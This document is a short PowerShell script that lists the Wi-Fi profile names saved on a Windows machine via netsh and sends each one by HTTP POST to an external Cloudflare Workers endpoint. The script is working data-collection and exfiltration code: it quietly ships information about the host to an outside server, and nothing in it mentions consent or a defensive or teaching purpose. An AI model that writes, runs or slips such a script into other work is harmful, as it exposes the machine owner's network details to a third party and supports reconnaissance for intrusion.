# Function to list Wi-Fi networks
function Get-WifiNetworks {
    $wifiNetworks = netsh wlan show profiles | Select-String -Pattern "All User Profile" | ForEach-Object {
        $_.ToString().Split(":")[1].Trim()
    }
    return $wifiNetworks
}

# Main script
try {
    # Get Wi-Fi networks
    $networks = Get-WifiNetworks

    # Display Wi-Fi networks
    Write-Host "Wi-Fi Networks:"
    $networks | ForEach-Object {
        Write-Host $_

        # Send Wi-Fi network to Cloudflare Worker endpoint
        $url = "https://worker-orange-snow-be6d.ryanwerh.workers.dev/"  # Replace with your Cloudflare Worker endpoint URL
        $body = $_
        Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "text/plain"
    }
}
catch {
    Write-Host "Error occurred: $_"
}
